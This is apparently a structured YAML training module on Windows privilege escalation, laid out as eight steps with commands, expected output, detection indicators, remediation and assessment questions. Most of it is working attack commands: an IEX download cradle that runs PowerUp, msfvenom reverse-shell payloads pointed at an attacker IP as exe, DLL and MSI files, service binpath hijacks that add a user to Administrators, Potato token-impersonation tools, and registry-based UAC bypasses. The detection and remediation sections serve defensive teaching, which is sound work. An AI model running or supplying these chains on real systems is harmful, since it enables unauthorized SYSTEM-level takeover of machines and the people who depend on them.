# Category: Offensive Security - Privilege Escalation - Windows
name: "Windows Privilege Escalation Techniques"
id: "privesc-win-001"
category: "privilege_escalation"
subcategory: "windows"
difficulty: "intermediate"
estimated_time: "90 minutes"

description: |
  Enumerate and exploit common Windows privilege escalation vectors to escalate
  from a low-privilege user to SYSTEM or Administrator. Covers service misconfigs,
  DLL hijacking, token impersonation, UAC bypass, and scheduled tasks.

learning_objectives:
  - Systematically enumerate Windows privilege escalation vectors
  - Exploit unquoted service paths and weak service permissions
  - Abuse token impersonation via Potato attacks
  - Bypass UAC and escalate from admin to SYSTEM

tools:
  - winpeas
  - powerup
  - seatbelt
  - winprivesc
  - msfvenom
  - accesschk
  - potato_exploits

prerequisites:
  - Low-privilege shell on target Windows system
  - PowerShell or cmd.exe access
  - Understanding of Windows services and tokens

steps:
  - id: "step1"
    phase: "reconnaissance"
    action: "Run automated Windows enumeration with WinPEAS"
    commands:
      - "# Download and run WinPEAS"
      - "certutil -urlcache -split -f https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe C:\\temp\\winpeas.exe"
      - "C:\\temp\\winpeas.exe"
      - "C:\\temp\\winpeas.exe quiet"
      - "# Run PowerUp (PowerShell-based)"
      - "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')"
      - "Invoke-AllChecks"
      - "# Seatbelt for additional checks"
      - "Seatbelt.exe -group=system"
      - "Seatbelt.exe -group=all"
    expected_output: "Highlighted privilege escalation opportunities across all vectors"
    detection: "WinPEAS execution (process creation Event 4688); PowerShell download cradle"

  - id: "step2"
    phase: "enumeration"
    action: "Manual system enumeration"
    commands:
      - "# Current user and privileges"
      - "whoami /all"
      - "net user %username%"
      - "# OS version and patches"
      - "systeminfo"
      - "wmic qfe list brief"
      - "# Running services"
      - "sc query state= all"
      - "wmic service list brief"
      - "# Scheduled tasks"
      - "schtasks /query /fo LIST /v"
      - "# AlwaysInstallElevated"
      - "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
      - "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
      - "# Stored credentials"
      - "cmdkey /list"
      - "# Unattended install files"
      - "dir /s /b C:\\sysprep.inf C:\\sysprep\\sysprep.xml C:\\Windows\\Panther\\Unattend.xml 2>nul"
    expected_output: "System configuration, installed patches, services, and potential escalation vectors"
    detection: "reg query and wmic execution in process creation logs"

  - id: "step3"
    phase: "exploitation"
    action: "Unquoted service path exploitation"
    commands:
      - "# Find unquoted service paths"
      - "wmic service get name,displayname,pathname,startmode | findstr /i /v '\"C:\\Windows' | findstr /i /v '\"\"'"
      - "sc qc [service_name]"
      - "# PowerUp check"
      - "Get-ServiceUnquoted"
      - "# If path is: C:\\Program Files\\Some Service\\service.exe"
      - "# Try placing malicious binary at:"
      - "# C:\\Program.exe or C:\\Program Files\\Some.exe"
      - "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f exe -o C:\\Program.exe"
      - "# Restart service (if permission allows)"
      - "sc stop [service_name]"
      - "sc start [service_name]"
      - "# Or wait for system reboot"
    expected_output: "Reverse shell or SYSTEM shell when service starts malicious binary"
    detection: "Service binary execution from unexpected path; sc stop/start in logs"

  - id: "step4"
    phase: "exploitation"
    action: "Weak service permissions exploitation"
    commands:
      - "# Find services with weak permissions using accesschk"
      - "accesschk.exe -uwcqv * /accepteula"
      - "accesschk.exe -uwcqv [username] * /accepteula"
      - "# PowerUp check"
      - "Get-ModifiableService | Select-Object Name,StartName"
      - "# If SERVICE_ALL_ACCESS or SERVICE_CHANGE_CONFIG permission"
      - "sc config [service_name] binpath= 'C:\\temp\\shell.exe'"
      - "sc config [service_name] binpath= 'cmd.exe /k net localgroup administrators [username] /add'"
      - "sc stop [service_name]"
      - "sc start [service_name]"
      - "# Using PowerUp"
      - "Invoke-ServiceAbuse -Name [service_name] -UserName [username]"
    expected_output: "User added to local Administrators group or shell as SYSTEM"
    detection: "sc config changes in audit log; service binary path modified (EventID 7040)"

  - id: "step5"
    phase: "exploitation"
    action: "DLL hijacking"
    commands:
      - "# Find missing DLLs using Process Monitor (on dev/test system)"
      - "# procmon.exe with filter: Result=NAME NOT FOUND and Path ends with .dll"
      - "# Or use PowerUp"
      - "Find-ProcessDLLHijack"
      - "Find-PathDLLHijack"
      - "# Create malicious DLL"
      - "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f dll -o /tmp/missing.dll"
      - "# Place in writable directory that's in service search path"
      - "copy /tmp/missing.dll C:\\path\\to\\hijack\\location\\missing.dll"
      - "# Trigger DLL load (restart service or application)"
      - "sc restart [vulnerable_service]"
      - "# Check path order (PATH variable)"
      - "echo %PATH%"
      - "# Create malicious DLL with same exports as original (DLL proxying)"
      - "# Write malicious DLL that loads original and executes payload"
    expected_output: "DLL loaded from controlled path, executing payload as service user"
    detection: "DLL loaded from unexpected directory; new DLL in application directory (file creation)"

  - id: "step6"
    phase: "exploitation"
    action: "Token impersonation — Potato attacks"
    commands:
      - "# Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege"
      - "whoami /priv"
      - "# GodPotato (works on Windows Server 2012-2022)"
      - "GodPotato.exe -cmd 'cmd /c whoami'"
      - "GodPotato.exe -cmd 'cmd /c net localgroup administrators [username] /add'"
      - "# PrintSpoofer (Windows 10/Server 2019)"
      - "PrintSpoofer.exe -i -c cmd"
      - "PrintSpoofer.exe -c 'C:\\temp\\shell.exe'"
      - "# JuicyPotatoNG"
      - "JuicyPotatoNG.exe -t * -p C:\\temp\\shell.exe"
      - "# SweetPotato"
      - "SweetPotato.exe -p C:\\temp\\shell.exe"
      - "# RoguePotato"
      - "RoguePotato.exe -r [attacker_ip] -e C:\\temp\\shell.exe -l 9999"
    expected_output: "SYSTEM shell via token impersonation from SeImpersonatePrivilege"
    detection: "Potato tool execution (process creation 4688); SYSTEM shell from service account"

  - id: "step7"
    phase: "exploitation"
    action: "AlwaysInstallElevated MSI privilege escalation"
    commands:
      - "# Verify both registry keys are set to 1"
      - "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
      - "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
      - "# Create malicious MSI"
      - "msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attacker_ip] LPORT=4444 -f msi -o /tmp/privesc.msi"
      - "# Transfer and run MSI"
      - "msiexec /quiet /qn /i C:\\temp\\privesc.msi"
      - "# PowerUp"
      - "Write-UserAddMSI"
    expected_output: "SYSTEM shell from MSI installation with elevated privileges"
    detection: "msiexec.exe execution by low-priv user; MSI installation from temp directory"

  - id: "step8"
    phase: "exploitation"
    action: "UAC bypass techniques"
    commands:
      - "# Check UAC level"
      - "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin"
      - "# Method 1: fodhelper.exe (Windows 10)"
      - "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d cmd.exe /f"
      - "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /d '' /f"
      - "C:\\Windows\\System32\\fodhelper.exe"
      - "# Method 2: eventvwr.exe"
      - "reg add HKCU\\Software\\Classes\\mscfile\\Shell\\Open\\command /d cmd.exe /f"
      - "eventvwr.exe"
      - "# Method 3: SilentCleanup scheduled task"
      - "reg add HKCU\\Environment /v windir /d 'cmd.exe /k reg delete HKCU\\Environment /v windir /f && REM ' /f"
      - "schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I"
      - "# Metasploit UAC bypass"
      - "use exploit/windows/local/bypassuac_fodhelper"
    expected_output: "Elevated cmd.exe spawned as Administrator without UAC prompt"
    detection: "fodhelper/eventvwr spawning cmd.exe; unexpected registry key under HKCU\\Software\\Classes"

compliance_controls:
  - standard: "MITRE ATT&CK"
    control: "T1574.001"
    description: "Hijack Execution Flow: DLL Search Order Hijacking"
  - standard: "MITRE ATT&CK"
    control: "T1548.002"
    description: "Abuse Elevation Control: Bypass User Account Control"
  - standard: "MITRE ATT&CK"
    control: "T1134.001"
    description: "Access Token Manipulation: Token Impersonation/Theft"
  - standard: "CIS Controls v8"
    control: "5.4"
    description: "Restrict administrator privileges"
  - standard: "NIST 800-53 Rev5"
    control: "AC-6"
    description: "Least privilege"

detection:
  network_indicators:
    - "Reverse shell outbound connections from service accounts (SYSTEM, NETWORK SERVICE)"
  log_indicators:
    - "EventID 4688: Unexpected process creation by service accounts"
    - "EventID 7040: Service binary path changed"
    - "EventID 4698: Scheduled task created by low-privilege user"
    - "Registry modification under HKCU\\Software\\Classes (UAC bypass)"
  endpoint_indicators:
    - "WinPEAS or PowerUp execution artifacts"
    - "New DLLs in application directories"
    - "MSI installation from temp directory by low-privilege user"

remediation:
  immediate:
    - "Quote all service binary paths containing spaces"
    - "Restrict service binary directory permissions to SYSTEM/Administrators only"
    - "Remove SeImpersonatePrivilege from non-system service accounts"
    - "Set UAC to 'Always Notify' (highest level)"
  long_term:
    - "Deploy LAPS for unique local administrator passwords"
    - "Implement CIS Windows benchmark for service hardening"
    - "Enable Windows Defender Application Control (WDAC) to restrict binary execution"
    - "Regular privilege escalation assessments as part of red team exercises"

variables:
  attacker_ip: "10.10.10.1"
  username: "lowprivuser"
  service_name: "VulnerableService"
  target_ip: "192.168.1.50"

assessment_questions:
  - "What registry keys must both be set to 1 for AlwaysInstallElevated to work?"
  - "How does the unquoted service path vulnerability work?"
  - "Which Windows privilege enables Potato-based token impersonation attacks?"
  - "What is the difference between UAC bypass and privilege escalation?"
  - "How does DLL search order hijacking work in Windows?"

references:
  - url: "https://github.com/carlospolop/PEASS-ng"
    title: "WinPEAS - Windows Privilege Escalation"
  - url: "https://gtfobins.github.io/"
    title: "GTFOBins"
  - url: "https://github.com/itm4n/PrintSpoofer"
    title: "PrintSpoofer - Token Impersonation"
  - url: "https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation"
    title: "HackTricks Windows Privilege Escalation"
